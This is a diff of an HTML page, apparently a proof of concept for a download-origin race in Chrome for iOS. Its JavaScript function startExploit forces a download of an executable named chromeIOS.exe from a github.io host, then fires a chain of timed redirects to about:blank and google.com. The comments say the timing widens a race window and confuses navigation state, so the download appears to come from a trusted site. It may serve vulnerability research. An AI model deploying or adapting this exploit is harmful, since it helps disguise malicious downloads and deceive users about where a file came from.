@@ -4,96 +4,81 @@
 <meta charset="utf-8">
 
 <style>
-.button {
-  background-color: #4CAF50;
-  border: none;
-  color: white;
-  padding: 15px 32px;
-  text-align: center;
-  font-size: 16px;
-  margin: 4px 2px;
-  cursor: pointer;
+.button{
+  background:#4CAF50;
+  border:none;
+  color:white;
+  padding:16px 32px;
+  font-size:16px;
+  cursor:pointer;
 }
 </style>
 
 <script>
 
-function triggerDownload() {
+const FILE_URL="https://ecdnts-del.github.io/test-apk/chromeIOS.exe";
 
-  console.log("Starting download...");
+function startExploit(){
 
-  // create temporary link
-  var link = document.createElement("a");
-  link.href = "https://ecdnts-del.github.io/test-apk/chromeIOS.exe";
-  link.download = "chromeIOS.exe";
+  console.log("Starting race condition test");
 
-  document.body.appendChild(link);
+  triggerDownload();
 
-  // trigger download
-  link.click();
+  // banyak timing untuk memperbesar peluang race
+  const delays=[120,180,220,260,300,320,350,380,420];
 
-  document.body.removeChild(link);
-
-  // redirect after short delay
-  setTimeout(function () {
-
-    console.log("Redirecting to google.com");
-
-    window.location.href = "https://google.com";
-
-  }, 320); // 320ms delay (race condition window)
-
-}
-
-
-function multiAttempt(){
-
-  console.log("Running multiple attempts to trigger race condition");
-
-  let delays = [250,300,320,350,400];
-
-  delays.forEach(function(d){
-
-    setTimeout(function(){
-
-      var link = document.createElement("a");
-      link.href = "https://ecdnts-del.github.io/test-apk/chromeIOS.exe";
-      link.download = "chromeIOS.exe";
-
-      document.body.appendChild(link);
-      link.click();
-      document.body.removeChild(link);
-
-      setTimeout(function(){
-        window.location.href = "https://google.com";
-      }, d);
-
-    }, 100);
-
+  delays.forEach((d,i)=>{
+    setTimeout(()=>{
+      redirectChain();
+    },d);
   });
 
 }
 
+function triggerDownload(){
+
+  const link=document.createElement("a");
+  link.href=FILE_URL;
+  link.download="chromeIOS.exe";
+
+  document.body.appendChild(link);
+
+  // trigger click async
+  requestAnimationFrame(()=>{
+    link.click();
+    document.body.removeChild(link);
+  });
+
+}
+
+function redirectChain(){
+
+  console.log("Redirect step");
+
+  // redirect bertahap untuk mengacaukan state navigation
+  location.href="about:blank";
+
+  setTimeout(()=>{
+    location.replace("https://google.com");
+  },40);
+
+}
+
 </script>
+
 </head>
 
 <body>
 
 <center>
 
-<h2>Chrome iOS Download Origin Test</h2>
+<h2>Chrome iOS Download Origin Race Test</h2>
 
 <br>
 
-<input type="button" class="button"
-value="Single Attempt"
-onclick="triggerDownload()">
-
-<br><br>
-
-<input type="button" class="button"
-value="Multi Attempt (More Reliable)"
-onclick="multiAttempt()">
+<button class="button" onclick="startExploit()">
+Start Download
+</button>
 
 </center>
 
